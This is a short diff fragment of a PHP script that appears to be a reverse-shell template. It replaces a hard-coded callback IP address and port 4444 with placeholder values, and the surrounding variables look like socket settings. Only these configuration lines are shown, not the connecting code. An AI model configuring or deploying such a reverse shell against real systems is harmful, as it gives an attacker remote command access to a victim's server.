@@ -5,8 +5,8 @@
 
   set_time_limit (0);
   $VERSION = "1.0";
-  $ip = '192.168.100.1';  // You have changed this
-  $port = 4444;  // And this
+  $ip = 'ip_adress';  // You have changed this
+  $port = port_number;  // And this
   $chunk_size = 1400;
   $write_a = null;
   $error_a = null;
